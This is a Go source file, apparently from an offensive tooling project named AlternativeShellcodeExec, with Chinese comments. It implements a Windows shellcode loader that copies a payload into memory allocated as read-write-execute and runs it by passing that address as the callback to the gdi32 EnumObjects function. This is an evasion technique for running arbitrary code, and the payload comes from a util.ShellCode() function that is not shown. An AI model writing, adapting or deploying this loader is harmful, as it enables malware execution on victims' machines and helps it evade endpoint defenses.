package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"syscall"
	"unsafe"
)

const (
	OBJ_BRUSH              = 1
	MEM_RESERVE            = 0x2000
	MEM_COMMIT             = 0x1000
	PAGE_EXECUTE_READWRITE = 0x40
	DEFAULT_CHARSET        = 1
)

// LogFontW represents the Windows LOGFONTW structure
type LogFontW struct {
	Height         int32
	Width          int32
	Escapement     int32
	Orientation    int32
	Weight         int32
	Italic         byte
	Underline      byte
	StrikeOut      byte
	CharSet        byte
	OutPrecision   byte
	ClipPrecision  byte
	Quality        byte
	PitchAndFamily byte
	FaceName       [32]uint16
}

func Run(op []byte) {
	// 为存储 op 分配内存
	kernel32, _ := syscall.LoadDLL("kernel32.dll")
	virtualAlloc, _ := kernel32.FindProc("VirtualAlloc")
	addr, _, _ := virtualAlloc.Call(0, uintptr(len(op)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)

	// 处理 op 数组
	for i := range op {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = op[i]
	}

	// 创建 LOGFONTW 结构
	var lf LogFontW
	lf.CharSet = DEFAULT_CHARSET // 使用 1 代替 DEFAULT_CHARSET

	// 获取设备上下文
	user32, _ := syscall.LoadDLL("user32.dll")
	getDC, _ := user32.FindProc("GetDC")
	dc, _, _ := getDC.Call(0)

	// 使用 EnumObjects 调用 shellcode
	gdi32, _ := syscall.LoadDLL("gdi32.dll")
	enumObjects, _ := gdi32.FindProc("EnumObjects")
	ret, _, err := enumObjects.Call(dc, OBJ_BRUSH, addr, 0)
	if ret == 0 {
		fmt.Printf("EnumObjects failed: %v\n", err)
		return
	}
}

func main() {
	Run(util.ShellCode())
}
